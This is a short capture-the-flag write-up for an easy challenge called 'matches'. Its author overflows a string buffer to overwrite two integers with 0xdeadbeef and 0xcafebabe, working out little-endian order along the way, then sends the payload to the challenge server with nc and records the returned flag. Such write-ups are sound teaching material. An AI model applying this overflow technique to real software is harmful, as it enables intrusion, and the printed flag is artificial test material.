# matches (easy)

Can you play matchmaker for me? I'm finding it impossible...

Author: krloer

nc 20.251.64.64 1031

📎 [matches_handout.tar.gz](matches_handout.tar.gz)

# WRiteup

Tested by tossing a lot of letters into the data and I saw this:

```bash
└─$ echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | ./matches 
Welcome, please set some variables.
first number: 
another number: 
and then a string: 
num1: 1633771873, num2: 1633771873, string: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Thank you for your service
```

then

```bash
└─$ echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaA" | nc 20.251.64.64 1031
Welcome, please set some variables.
first number: 
another number: 
and then a string: 
num1: 0, num2: 65, string: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaA
Thank you for your service
```

A is the hex value for 65, so I'm guessing I need to inject things.. I tried with echo -e and using `\x01` and I got num2 to show 1, and `\x02` was 2 e.t.c. So I could inject the number. I tried `\xde\xad\xbe\xef` but that did not look correct? Then tried one by one to see if it matched.. `\xde` was 222 which was right. Adding `\xad` was 
`1684109534` but supposed to be `57005`. I flipped em around and did `\xAD\xDE` and bingo: `57005`. So now I could inject the number. 

```bash
└─$ echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xEF\xBE\xAD\xDE\xBE\xBA\xFE\xCA" | nc 20.251.64.64 1031
Welcome, please set some variables.
first number: 
another number: 
and then a string: 
Congratulations! Here is your flag: 
wack{sc4anf_is_gets?}
```

# Flag

```
wack{sc4anf_is_gets?}
```